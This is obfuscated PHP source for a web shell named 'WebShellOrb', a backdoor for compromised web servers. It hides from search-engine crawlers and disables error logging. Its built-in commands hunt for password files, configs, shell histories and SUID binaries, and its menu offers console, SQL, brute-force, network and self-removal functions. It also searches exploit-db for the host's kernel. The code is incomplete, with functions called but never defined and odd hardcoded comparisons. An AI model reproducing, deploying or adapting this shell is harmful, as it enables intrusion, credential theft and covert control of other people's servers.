<?php
${"GLOBALS"}['jehnwkvhq'] = 'default_action';
${"GLOBALS"}['jbzeoab'] = 'bind_port_p';
${"GLOBALS"}['rnphbwgqyad'] = 't';
${"GLOBALS"}['eelpcfsuym'] = 'w';
${"GLOBALS"}['kmiihcqpanrs'] = 'file';
${"GLOBALS"}['gletwnspjntd'] = 'title';
${"GLOBALS"}['dncwbwlrbd'] = 'tbls_res';
${"GLOBALS"}['xrdbnxfmvt'] = 'value';
${"GLOBALS"}['txyjmywp'] = 'table';
${"GLOBALS"}['amehtg'] = 'columns';
${"GLOBALS"}['sdigtdgih'] = 'head';
${"GLOBALS"}['lwqrio'] = 'sql';
${"GLOBALS"}['lfljrdmc'] = 'create';
${"GLOBALS"}['lhydmmywwn'] = 'str';
${"GLOBALS"}['bopmwejgirf'] = 'db';
${"GLOBALS"}['omanxfropl'] = 'line';
${"GLOBALS"}['nnwtcnvv'] = 'server';
${"GLOBALS"}['civkgkkc'] = 'attempts';
${"GLOBALS"}['nscqaqn'] = 'success';
${"GLOBALS"}['bdrlwjttk'] = 'login';
${"GLOBALS"}['icduirvc'] = 'pass';
${"GLOBALS"}['ymhnnp'] = 'res';
${"GLOBALS"}['nhegyujkbg'] = 'port';
${"GLOBALS"}['qelasgmoq'] = 'ip';
${"GLOBALS"}['srhpuno'] = 'len';
${"GLOBALS"}['rifohoju'] = 'time';
${"GLOBALS"}['bgbndglw'] = 'perms';
${"GLOBALS"}['tbrhqbi'] = 'fp';
${"GLOBALS"}['gigsmqyowb'] = 'paths';
${"GLOBALS"}['dyvthet'] = 'stringTools';
${"GLOBALS"}['mwpoytmwus'] = 'r';
${"GLOBALS"}['gayaio'] = 'l';
${"GLOBALS"}['slzbugds'] = 'b';
${"GLOBALS"}['cxfbyfxajt'] = 'a';
${"GLOBALS"}['punnqnswy'] = 'gr';
${"GLOBALS"}['zppzcsfgo'] = 'ow';
${"GLOBALS"}['qanhuo'] = 'dirContent';
${"GLOBALS"}['xzocqroestsp'] = 'dirs';
${"GLOBALS"}['khtkbtbcp'] = 'match';
${"GLOBALS"}['wxflrkghg'] = 'sort';
${"GLOBALS"}['oocwabo'] = 'key';
${"GLOBALS"}['xqjcyjffi'] = 'iterator';
${"GLOBALS"}['aihxtguj'] = 'h';
${"GLOBALS"}['smcbgcyi'] = 'd';
${"GLOBALS"}['sbuwwkozt'] = 'c';
${"GLOBALS"}['vxhdoihqlkd'] = 'type';
${"GLOBALS"}['ecbcmiybue'] = 'tmp';
${"GLOBALS"}['phgjytx'] = 'danger';
${"GLOBALS"}['mercgmdwe'] = 'temp';
${"GLOBALS"}['onmdrx'] = 'n';
${"GLOBALS"}['yluxecll'] = 'files';
${"GLOBALS"}['rbasqp'] = 'filename';
${"GLOBALS"}['qubwkb'] = 'dh';
${"GLOBALS"}['leuwumt'] = 'dir';
${"GLOBALS"}['vwhnmvbzmuqd'] = 'p';
${"GLOBALS"}['uopupgy'] = 's';
${"GLOBALS"}['sberlg'] = 'f';
${"GLOBALS"}['fnkkdtgr'] = 'in';
${"GLOBALS"}['qdurqmqjmbr'] = 'out';
${"GLOBALS"}['brvjme'] = 'is_writable';
${"GLOBALS"}['plyulhiuro'] = 'freeSpace';
${"GLOBALS"}['cblwsfsrxdw'] = 'drive';
${"GLOBALS"}['ofhwsmmm'] = 'drives';
${"GLOBALS"}['vvdxmjbgec'] = 'v';
${"GLOBALS"}['wwtfgcddf'] = 'menu';
${"GLOBALS"}['fskqowyovpk'] = 'm';
${"GLOBALS"}['bdmqwqvfqn'] = 'item';
${"GLOBALS"}['mgvkxgcmofyr'] = 'opt_charsets';
${"GLOBALS"}['ffswlhab'] = 'path';
${"GLOBALS"}['rxgtddszwqnr'] = 'j';
${"GLOBALS"}['clkuyojj'] = 'i';
${"GLOBALS"}['qumrcez'] = 'cwd_links';
${"GLOBALS"}['gkjyrzxng'] = 'uid';
${"GLOBALS"}['hxhfbflhzlt'] = 'user';
${"GLOBALS"}['uyrzfubjl'] = 'group';
${"GLOBALS"}['elkyxmiyu'] = 'gid';
${"GLOBALS"}['ccoxzyjv'] = 'release';
${"GLOBALS"}['bxyoytprd'] = 'explink';
${"GLOBALS"}['vgkonizq'] = 'kernel';
${"GLOBALS"}['mtmcgbuxstj'] = 'totalSpace';
${"GLOBALS"}['uolbyjcowuum'] = 'aliases';
${"GLOBALS"}['rqlrvrqjdye'] = 'cwd';
${"GLOBALS"}['ppyxsbssm'] = 'home_cwd';
${"GLOBALS"}['cpxsnhfrvxnr'] = 'safe_mode';
${"GLOBALS"}['tngplbofyfxj'] = 'os';
$slswzwwiy = 'os';
$qvuswnnljk = 'cwd';
${"GLOBALS"}['oqvryxe'] = 'k';
${"GLOBALS"}['egcnymujkiu'] = 'array';
${"GLOBALS"}['dbdznjgxv'] = 'userAgents';
${"GLOBALS"}['cdkparndoqp'] = 'auth_pass';
${"GLOBALS"}['wqnrzv'] = 'default_use_ajax';
${"GLOBALS"}['cnreqxxxyx'] = 'color';
${"GLOBALS"}['vnvuep'] = 'os';
error_reporting(0);
$rcnyvpgwp = 'default_action';
${${"GLOBALS"}['cnreqxxxyx']} = '#df5';
${$rcnyvpgwp} = 'FilesMan';
${${"GLOBALS"}['wqnrzv']} = true;
${"GLOBALS"}['hxwowixkcah'] = 'disable_functions';
${"GLOBALS"}['oecyizwdg'] = 'default_charset';
${${"GLOBALS"}['oecyizwdg']} = 'Windows-1251';
${${"GLOBALS"}['cdkparndoqp']} = '';
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $funwst = 'userAgents';
    ${$funwst} = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler');
    if (preg_match("/" . 'Google|Slurp|MSNBot|ia_archiver|Yandex|Rambler/i', $_SERVER['HTTP_USER_AGENT'])) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
$jkanbtmrlf = 'auth_pass';
@set_time_limit(0);
$iqvdvclroyby = 'aliases';
@define("WebShellOrb_VERSION", "2.6");
if (!empty(${$jkanbtmrlf})) {
    $mewlffwp = 'auth_pass';
    ${"GLOBALS"}['ccrrecjgmg'] = 'auth_pass';
    ${"GLOBALS"}['uwlnxnqkvyx'] = 'auth_pass';
    if (isset($_POST['pass']) && md5($_POST['pass']) == '') {
        WebShellOrbsetcookie(md5($_SERVER['HTTP_HOST']), ${$mewlffwp});
    }
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != '') {
        WebShellOrbLogin();
    }
}
if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    ${${"GLOBALS"}['vnvuep']} = 'win';
} else {
    ${${"GLOBALS"}['tngplbofyfxj']} = 'nix';
}
${${"GLOBALS"}['cpxsnhfrvxnr']} = @ini_get("safe_mode");
if (!${${"GLOBALS"}['cpxsnhfrvxnr']}) {
    error_reporting(0);
}
${${"GLOBALS"}['hxwowixkcah']} = @ini_get("disable_functions");
${${"GLOBALS"}['ppyxsbssm']} = @getcwd();
if (isset($_POST['c'])) {
    @chdir($_POST['c']);
}
${${"GLOBALS"}['rqlrvrqjdye']} = @getcwd();
if ('nix' == 'win') {
    ${${"GLOBALS"}['ppyxsbssm']} = str_replace("\\", "/", ${${"GLOBALS"}['ppyxsbssm']});
    $sjfvibvmk = 'cwd';
    ${$sjfvibvmk} = str_replace("\\", "/", ${${"GLOBALS"}['rqlrvrqjdye']});
}
${"GLOBALS"}['wmcgcguq'] = 'os';
if (${$qvuswnnljk}[strlen(${${"GLOBALS"}['rqlrvrqjdye']}) - 1] != '/') {
    ${${"GLOBALS"}['rqlrvrqjdye']} .= '/';
}
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool) ${${"GLOBALS"}['wqnrzv']};
}
if ('nix' == 'win') {
    ${${"GLOBALS"}['uolbyjcowuum']} = array('dir', 'dir /s /w /b index.php', 'dir /s /w /b *config*.php', 'netstat -an', 'net start', 'net user', 'net view', 'arp -a', 'ipconfig /all');
} else {
    ${$iqvdvclroyby} = array('ls -lha', 'lsattr -va', 'netstat -an | grep -i listen', 'ps aux', '', 'find / -type f -perm -04000 -ls', 'find . -type f -perm -04000 -ls', 'find / -type f -perm -02000 -ls', 'find . -type f -perm -02000 -ls', 'find / -type f -name config.inc.php', 'find / -type f -name "config*"', 'find . -type f -name "config*"', 'find / -perm -2 -ls', 'find . -perm -2 -ls', 'find / -type f -name service.pwd', 'find . -type f -name service.pwd', 'find / -type f -name .htpasswd', 'find . -type f -name .htpasswd', 'find / -type f -name .bash_history', 'find . -type f -name .bash_history', 'find / -type f -name .fetchmailrc', 'find . -type f -name .fetchmailrc', '', 'locate httpd.conf', 'locate vhosts.conf', 'locate proftpd.conf', 'locate psybnc.conf', 'locate my.conf', 'locate admin.php', 'locate cfg.php', 'locate conf.php', 'locate config.dat', 'locate config.php', 'locate config.inc', 'locate config.inc.php', 'locate config.default.php', 'locate config', 'locate \'.conf\'', 'locate \'.pwd\'', 'locate \'.sql\'', 'locate \'.htpasswd\'', 'locate \'.bash_history\'', 'locate \'.mysql_history\'', 'locate \'.fetchmailrc\'', 'locate backup', 'locate dump', 'locate priv');
}
function WebShellOrbHeader()
{
    ${"GLOBALS"}['lfcdhxiqrjuc'] = 'freeSpace';
    $cvyfemar = 'i';
    $gigkkylcom = 'v';
    ${"GLOBALS"}['rtzgviw'] = 'item';
    $jeuwvfj = 'path';
    $syynptc = 'uid';
    $unibgzq = 'release';
    ${"GLOBALS"}['qhgnljws'] = 'totalSpace';
    if (empty($_POST['charset'])) {
        $_POST['charset'] = 'Windows-1251';
    }
    ${"GLOBALS"}['paallywki'] = 'explink';
    $unjshhsygx = 'item';
    ${"GLOBALS"}['rrsayeov'] = 'k';
    ${"GLOBALS"}['tlmqysbj'] = 'user';
    $mzcbhnv = 'n';
    global $color;
    $ylknujmswar = 'charsets';
    $fnmpbhsrxkxs = 'release';
    echo '<html><head><meta http-equiv=\'Content-Type\' content=\'text/html; charset=' . $_POST['charset'] . '\'><title>' . $_SERVER['HTTP_HOST'] . ' - WebShellOrb ' . WebShellOrb_VERSION . "</title>\n<style>\nbody{background-color:#444;color:#e1e1e1;}\nbody,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\ntable.info{ color:#fff;background-color:#222; }\nspan,h1,a{ color: {$color} !important; }\nspan{ font-weight: bolder; }\nh1{ border-left:5px solid {$color};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\ndiv.content{ padding: 5px;margin-left:5px;background-color:#333; }\na{ text-decoration:none; }\na:hover{ text-decoration:underline; }\n.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\n.bigarea{ width:100%;height:300px; }\ninput,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$color}; font: 9pt Monospace,'Courier New'; }\nform{ margin:0px; }\n#toolsTbl{ text-align:center; }\n.toolsInp{ width: 300px }\n.main th{text-align:left;background-color:#5e5e5e;}\n.main tr:hover{background-color:#5e5e5e}\n.l1{background-color:#444}\n.l2{background-color:#333}\npre{font-family:Courier,Monospace;}\n</style>\n<script>\n    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . '\';
    var a_ = \'' . htmlspecialchars(@$_POST['a']) . '\'
    var charset_ = \'' . htmlspecialchars(@$_POST['charset']) . '\';
    var p1_ = \'' . (strpos(@$_POST['p1'], '
') !== false ? "" : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . '\';
    var p2_ = \'' . (strpos(@$_POST['p2'], '
') !== false ? "" : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . '\';
    var p3_ = \'' . (strpos(@$_POST['p3'], '
') !== false ? "" : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . '\';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = \'ajax=true\';
		for(i=0;i<d.mf.elements.length;i++)
			params += \'&\'+d.mf.elements[i].name+\'=\'+encodeURIComponent(d.mf.elements[i].value);
		sr(\'' . addslashes($_SERVER['REQUEST_URI']) . '\', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject(\'Microsoft.XMLHTTP\');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open(\'POST\', url, true);
            req.setRequestHeader (\'Content-Type\', \'application/x-www-form-urlencoded\');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\\\d+)([\\\\S\\\\s]*)", \'m\');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert(\'Request error!\');
	}
</script>
<head><body><div style=\'position:absolute;width:100%;background-color:#444;top:0;left:0;\'>
<form method=post name=mf style=\'display:none;\'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>';
    $xfernkifiv = 'kernel';
    ${${"GLOBALS"}['lfcdhxiqrjuc']} = @diskfreespace($GLOBALS['cwd']);
    ${${"GLOBALS"}['mtmcgbuxstj']} = @disk_total_space($GLOBALS['cwd']);
    ${${"GLOBALS"}['qhgnljws']} = ${${"GLOBALS"}['mtmcgbuxstj']} ? ${${"GLOBALS"}['mtmcgbuxstj']} : 1;
    $wjslkgig = 'charsets';
    ${$fnmpbhsrxkxs} = @php_uname("r");
    ${$xfernkifiv} = @php_uname("s");
    ${"GLOBALS"}['devrcywexce'] = 'i';
    ${${"GLOBALS"}['paallywki']} = 'https://www.exploit-db.com/search?q=';
    if (strpos('Linux', ${${"GLOBALS"}['vgkonizq']}) !== false) {
        ${${"GLOBALS"}['bxyoytprd']} .= urlencode('Linux Kernel ' . substr(${${"GLOBALS"}['ccoxzyjv']}, 0, 6));
    } else {
        ${${"GLOBALS"}['bxyoytprd']} .= urlencode(${${"GLOBALS"}['vgkonizq']} . ' ' . substr(${$unibgzq}, 0, 3));
    }
    $yuriqttm = 'path';
    $dapwvlq = 'n';
    ${"GLOBALS"}['cdovfzfgp'] = 'menu';
    if (!function_exists('posix_getegid')) {
        ${"GLOBALS"}['jvxsiqqu'] = 'uid';
        $aiyfiiwq = 'user';
        ${$aiyfiiwq} = @get_current_user();
        ${${"GLOBALS"}['jvxsiqqu']} = @getmyuid();
        ${${"GLOBALS"}['elkyxmiyu']} = @getmygid();
        ${${"GLOBALS"}['uyrzfubjl']} = '?';
    } else {
        $hnryuak = 'gid';
        $lzwmbumx = 'uid';
        ${$lzwmbumx} = @posix_getpwuid(posix_geteuid());
        ${$hnryuak} = @posix_getgrgid(posix_getegid());
        ${"GLOBALS"}['tufvwq'] = 'gid';
        ${"GLOBALS"}['mejxibh'] = 'gid';
        ${${"GLOBALS"}['hxhfbflhzlt']} = ${${"GLOBALS"}['gkjyrzxng']}['name'];
        ${${"GLOBALS"}['gkjyrzxng']} = ${${"GLOBALS"}['gkjyrzxng']}['uid'];
        ${${"GLOBALS"}['uyrzfubjl']} = ${${"GLOBALS"}['elkyxmiyu']}['name'];
        ${${"GLOBALS"}['tufvwq']} = ${${"GLOBALS"}['mejxibh']}['gid'];
    }
    ${"GLOBALS"}['ykiemhno'] = 'm';
    ${${"GLOBALS"}['qumrcez']} = '';
    ${$yuriqttm} = explode('/', $GLOBALS['cwd']);
    $yxdvqicqjzi = 'm';
    ${"GLOBALS"}['ietcukn'] = 'cwd_links';
    ${$dapwvlq} = count(${$jeuwvfj});
    for (${${"GLOBALS"}['devrcywexce']} = 0; ${$cvyfemar} < ${$mzcbhnv} - 1; ${${"GLOBALS"}['clkuyojj']}++) {
        ${"GLOBALS"}['urffjmdujbs'] = 'cwd_links';
        $nubocyjtuqn = 'j';
        ${"GLOBALS"}['guamecwi'] = 'j';
        $iyjeuqvfrl = 'cwd_links';
        ${${"GLOBALS"}['qumrcez']} .= '<a href=\'#\' onclick=\'g("FilesMan","';
        ${"GLOBALS"}['pzisplggic'] = 'i';
        for (${$nubocyjtuqn} = 0; ${${"GLOBALS"}['rxgtddszwqnr']} <= ${${"GLOBALS"}['clkuyojj']}; ${${"GLOBALS"}['rxgtddszwqnr']}++) {
            ${${"GLOBALS"}['urffjmdujbs']} .= ${${"GLOBALS"}['ffswlhab']}[0] . '/';
        }
        ${$iyjeuqvfrl} .= '")\'>' . ${${"GLOBALS"}['ffswlhab']}[0] . '/</a>';
    }
    ${$ylknujmswar} = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
    ${${"GLOBALS"}['mgvkxgcmofyr']} = '';
    $amhhbx = 'freeSpace';
    foreach (${$wjslkgig} as ${${"GLOBALS"}['rtzgviw']}) {
        ${${"GLOBALS"}['mgvkxgcmofyr']} .= '<option value="' . ${$unjshhsygx} . '" ' . ($_POST['charset'] == ${${"GLOBALS"}['bdmqwqvfqn']} ? "selected" : "") . '>' . ${${"GLOBALS"}['bdmqwqvfqn']} . '</option>';
    }
    ${${"GLOBALS"}['fskqowyovpk']} = array('SecInfo', 'FilesMan', 'Console', 'Sql', 'Php', 'StringTools', 'Bruteforce', 'Network');
    $fqtoyg = 'drives';
    if (!empty($GLOBALS['auth_pass'])) {
        ${${"GLOBALS"}['fskqowyovpk']}['Logout'] = 'Logout';
    }
    ${$yxdvqicqjzi}['Self remove'] = 'SelfRemove';
    ${${"GLOBALS"}['wwtfgcddf']} = '';
    foreach (${${"GLOBALS"}['fskqowyovpk']} as ${${"GLOBALS"}['oqvryxe']} => ${${"GLOBALS"}['vvdxmjbgec']}) {
        ${${"GLOBALS"}['cdovfzfgp']} .= '<th width="' . (int) (100 / count(${${"GLOBALS"}['ykiemhno']})) . '%">[ <a href="#" onclick="g(\'' . ${$gigkkylcom} . '\',null,\'\',\'\',\'\')">' . ${${"GLOBALS"}['rrsayeov']} . '</a> ]</th>';
    }
    ${${"GLOBALS"}['ofhwsmmm']} = '';
    if ('nix' == 'win') {
        ${"GLOBALS"}['bfeplaaxg'] = 'drive';
        foreach (range("c", "z") as ${${"GLOBALS"}['bfeplaaxg']}) {
            ${"GLOBALS"}['jilogpg'] = 'drive';
            if (is_dir(${${"GLOBALS"}['cblwsfsrxdw']} . ':\\')) {
                ${${"GLOBALS"}['ofhwsmmm']} .= '<a href="#" onclick="g(\'FilesMan\',\'' . ${${"GLOBALS"}['cblwsfsrxdw']} . ':/\')">[ ' . ${${"GLOBALS"}['jilogpg']} . ' ]</a> ';
            }
        }
    }
}
